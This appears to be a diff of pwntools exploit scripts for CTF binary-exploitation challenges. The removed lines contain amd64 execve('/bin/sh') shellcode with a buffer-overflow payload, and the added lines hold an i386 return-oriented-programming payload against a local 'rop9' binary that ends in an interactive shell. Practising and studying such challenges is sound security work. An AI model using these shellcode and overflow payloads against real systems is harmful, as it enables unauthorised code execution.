@@ -1,23 +1,14 @@
-from pwn import*
-context(os='linux', arch='amd64', log_level='debug')
-r = process('./pwn')
-shellcode = asm(
-'''
-xor 	rsi,	rsi			
-push	rsi				
-mov 	rdi,	0x68732f2f6e69622f	 
-push	rdi
-push	rsp		
-pop	rdi				
-mov 	al,	59			
-cdq					
-syscall
-'''
-)
+from pwn import *
 
-r.recvuntil("what's your name?")
-r.sendline(shellcode)
-r.recvuntil("what do you want?")
-payload = 'a'*0x30 + p64(0x0400737) + p64(0x06010A0)
+r=process('./pwn/stack/rop-9/rop9')
+
+context.arch="i386"
+context.log_level='debug'
+context.terminal=["tmux","splitw","-h"]
+#gdb.attach(r)
+
+
+payload=b'b'*(0x38)+p32(0x80489A0)+p32(0x0804E6A0)+p32(814536271)+p32(425138641)
 r.send(payload)
+
 r.interactive()
